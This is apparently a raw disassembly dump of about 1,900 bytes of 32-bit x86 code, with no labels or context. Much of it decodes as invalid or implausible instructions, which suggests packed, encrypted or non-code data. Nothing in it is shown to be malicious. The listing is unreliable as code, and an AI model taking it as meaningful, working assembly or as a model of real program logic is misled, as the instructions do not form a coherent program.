  40de92:	mov    bl,0x0
  40de94:	test   al,0x25
  40de96:	mov    al,0xb4
  40de98:	sub    DWORD PTR [edx+0x7c92be8],esp
  40de9e:	lahf   
  40de9f:	sbb    al,0x5e
  40dea1:	add    esi,DWORD PTR [edx+0x4b]
  40dea4:	push   ds
  40dea5:	adc    ch,0x17
  40dea8:	iret   
  40dea9:	jne    0x40de37
  40deab:	in     eax,dx
  40deac:	sti    
  40dead:	mov    edx,0x526165c4
  40deb2:	and    DWORD PTR ds:0xa892e71b,esp
  40deb8:	xor    eax,0xb92c4a7d
  40debd:	xor    eax,0xdb10cb2f
  40dec2:	jge    0x40df23
  40dec4:	mov    ds,WORD PTR [eax]
  40dec6:	fmul   QWORD PTR [esi-0x592e8676]
  40decc:	mov    ebx,0x1b70f855
  40ded1:	sbb    DWORD PTR [edi],edx
  40ded3:	inc    eax
  40ded4:	mov    eax,0xc47caeeb
  40ded9:	push   es
  40deda:	jl     0x40de88
  40dedc:	and    ch,0xa1
  40dedf:	mov    dh,0xa8
  40dee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dee2:	cmp    al,0xb6
  40dee4:	sub    ah,BYTE PTR es:[ecx-0x712e10e1]
  40deeb:	hlt    
  40deec:	mov    edi,0xe6c1fb44
  40def1:	cmp    DWORD PTR [ecx+eiz*1-0x3c77ee18],0x3f898083
  40defc:	lahf   
  40defd:	or     BYTE PTR [ebx],0xee
  40df00:	xchg   ebp,eax
  40df01:	ror    DWORD PTR [edi],1
  40df03:	fisttp QWORD PTR [edx-0x2574c782]
  40df09:	rol    bl,1
  40df0b:	xlat   BYTE PTR ds:[ebx]
  40df0c:	cs mov ecx,eax
  40df0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df10:	add    edx,eax
  40df12:	in     eax,0x1
  40df14:	adc    DWORD PTR [esi-0x45],ebx
  40df17:	push   ebx
  40df18:	dec    edx
  40df19:	xlat   BYTE PTR ds:[ebx]
  40df1a:	std    
  40df1b:	in     al,0x6d
  40df1d:	push   ss
  40df1e:	jmp    0xa50dd890
  40df23:	fwait
  40df24:	and    ah,BYTE PTR [edi-0xf]
  40df27:	enter  0x640c,0xbb
  40df2b:	inc    esp
  40df2c:	gs aad 0xfb
  40df2f:	not    BYTE PTR [ebp+0x19]
  40df32:	jne    0x40df35
  40df34:	bound  esi,QWORD PTR [eax+0x75e59b6a]
  40df3a:	frstor [ebx-0x39]
  40df3d:	jne    0x40ded5
  40df3f:	test   eax,0x3b47d041
  40df44:	lods   eax,DWORD PTR ds:[esi]
  40df45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df46:	push   ecx
  40df47:	cmp    eax,0x73156def
  40df4c:	loop   0x40df62
  40df4e:	jle    0x40df11
  40df50:	push   eax
  40df51:	pushf  
  40df52:	in     al,0xad
  40df54:	add    bl,dh
  40df56:	and    bl,ch
  40df58:	sub    al,BYTE PTR [edx+esi*1]
  40df5b:	aam    0xd4
  40df5d:	in     al,0x87
  40df5f:	hlt    
  40df60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df61:	test   DWORD PTR [esi-0x104cdf02],ebp
  40df67:	fistp  DWORD PTR [eax+0x1b]
  40df6a:	push   DWORD PTR [ecx+0x24]
  40df6d:	xchg   edx,eax
  40df6e:	inc    ecx
  40df6f:	test   BYTE PTR [ecx+0x6],dl
  40df72:	push   edi
  40df73:	and    bl,0xa7
  40df76:	inc    ebp
  40df77:	sub    ebx,ecx
  40df79:	xchg   ebx,ecx
  40df7b:	dec    ecx
  40df7c:	mov    eax,DWORD PTR [ebp-0x1c]
  40df7f:	imul   eax,ecx
  40df82:	add    esp,eax
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	shr    DWORD PTR [esp+ecx*4-0x78787613],1
  40dfad:	jle    0x40e02d
  40dfaf:	aas    
  40dfb0:	jg     0x40e030
  40dfb2:	jle    0x40df6a
  40dfb4:	mov    DWORD PTR ds:0x7b9efada,edi
  40dfba:	jmp    0x40e028
  40dfbc:	(bad)  
  40dfbd:	mov    esi,0xd61ac787
  40dfc2:	adc    al,0x1d
  40dfc4:	inc    eax
  40dfc5:	sbb    ch,cl
  40dfc7:	add    DWORD PTR ds:[ebx+0x3f],edi
  40dfcb:	test   BYTE PTR [ebp-0x25],0xa4
  40dfcf:	jmp    0x40dfbd
  40dfd1:	xchg   edx,eax
  40dfd2:	adc    eax,0x8824a88a
  40dfd7:	push   ebp
  40dfd8:	mov    cl,0x5
  40dfda:	les    esp,FWORD PTR [ecx]
  40dfdc:	add    dh,BYTE PTR [ebx+0x1d]
  40dfdf:	mov    esi,0xf4b9dd18
  40dfe4:	div    DWORD PTR ds:0x4b03b335
  40dfea:	call   0x38c106cb
  40dfef:	push   es
  40dff0:	int    0xd6
  40dff2:	lods   al,BYTE PTR ds:[esi]
  40dff3:	mov    edx,0xc41ddc39
  40dff8:	das    
  40dff9:	das    
  40dffa:	cwde   
  40dffb:	int    0x3e
  40dffd:	ficomp WORD PTR [ebx+esi*1]
  40e000:	mov    ah,0xab
  40e002:	xchg   DWORD PTR [esi+ebp*4-0x5e],eax
  40e006:	jmp    0x40e064
  40e008:	mov    esi,ds
  40e00a:	push   0x2c2c921f
  40e00f:	in     eax,dx
  40e010:	(bad)  
  40e011:	popf   
  40e012:	stos   BYTE PTR es:[edi],al
  40e013:	rcl    bh,1
  40e015:	push   ecx
  40e016:	xchg   edi,eax
  40e017:	mov    al,ds:0x1887907e
  40e01c:	or     BYTE PTR [esi-0x3],bl
  40e01f:	das    
  40e020:	xor    DWORD PTR [ecx+0x34e0c00b],0x5f132da9
  40e02a:	jno    0x40e051
  40e02c:	add    dh,bh
  40e02e:	aad    0xa8
  40e030:	fwait
  40e031:	or     edx,DWORD PTR [edi]
  40e033:	add    ah,0xd4
  40e036:	mov    es,WORD PTR [edi]
  40e038:	dec    eax
  40e039:	int    0xa4
  40e03b:	lahf   
  40e03c:	jp     0x40e0ac
  40e03e:	mov    bh,0xc9
  40e040:	aad    0x46
  40e042:	jl     0x40e091
  40e044:	cmp    BYTE PTR [edi],ch
  40e046:	popf   
  40e047:	out    dx,eax
  40e048:	ror    DWORD PTR [ecx-0x34ba65b3],cl
  40e04e:	lods   al,BYTE PTR ds:[esi]
  40e04f:	mov    ah,0x70
  40e051:	imul   edi,DWORD PTR [bx-0x1b],0x3f
  40e056:	(bad)  
  40e057:	xchg   ebx,eax
  40e058:	pushf  
  40e059:	and    ah,0xae
  40e05c:	push   cs
  40e05d:	pop    esi
  40e05e:	(bad)  
  40e05f:	aaa    
  40e060:	jnp    0x40e06d
  40e062:	fisubr DWORD PTR [ecx-0x2a]
  40e065:	std    
  40e066:	dec    eax
  40e067:	stos   DWORD PTR es:[edi],eax
  40e068:	mov    edx,0x73d7ef78
  40e06d:	test   al,0x49
  40e06f:	mov    dl,0x2e
  40e071:	cmp    al,0x8
  40e073:	(bad)  
  40e074:	cwde   
  40e075:	(bad)  
  40e077:	sar    dl,0xf2
  40e07a:	xchg   esi,eax
  40e07b:	iret   
  40e07c:	repz xor esp,DWORD PTR [eax+0x22]
  40e080:	mov    ebp,0x22da2098
  40e085:	loop   0x40e078
  40e087:	hlt    
  40e088:	cmp    al,0x83
  40e08a:	jb     0x40e020
  40e08c:	les    ebp,FWORD PTR [di-0x39]
  40e090:	call   0xd18f1858
  40e095:	loope  0x40e102
  40e097:	mov    dh,0xca
  40e099:	push   ecx
  40e09a:	sti    
  40e09b:	inc    esp
  40e09c:	mov    cl,0x9e
  40e09e:	add    eax,0x4a
  40e0a1:	dec    edx
  40e0a2:	addr16 (bad) 
  40e0a4:	loope  0x40e043
  40e0a6:	popa   
  40e0a7:	test   eax,0x9462f91f
  40e0ac:	dec    esi
  40e0ad:	jg     0x40e06a
  40e0af:	into   
  40e0b0:	jne    0x40e0e9
  40e0b2:	mov    ah,0xc
  40e0b4:	loopne 0x40e0fe
  40e0b6:	jae    0x40e076
  40e0b8:	push   eax
  40e0b9:	xchg   edi,eax
  40e0ba:	loopne 0x40e08d
  40e0bc:	fsubr  DWORD PTR [edx]
  40e0be:	mov    edx,0x9695008a
  40e0c3:	bound  ecx,QWORD PTR [edx+0x46b258d]
  40e0c9:	ret    0x1c74
  40e0cc:	add    BYTE PTR [edx],cl
  40e0ce:	pop    esi
  40e0cf:	mov    ss,WORD PTR [ebx-0x2d352c99]
  40e0d5:	inc    ebx
  40e0d6:	gs pop esi
  40e0d8:	inc    esp
  40e0d9:	adc    al,0xa6
  40e0db:	es push 0xffffff8f
  40e0de:	mov    ?,WORD PTR [ecx-0x32eecbb2]
  40e0e4:	pop    ds
  40e0e5:	mul    BYTE PTR [edi-0x6d4e20e9]
  40e0eb:	add    eax,DWORD PTR [edi]
  40e0ed:	or     BYTE PTR [edx+0x4cbb4c25],dh
  40e0f3:	jle    0x40e080
  40e0f5:	inc    ebp
  40e0f6:	hlt    
  40e0f7:	pop    edi
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
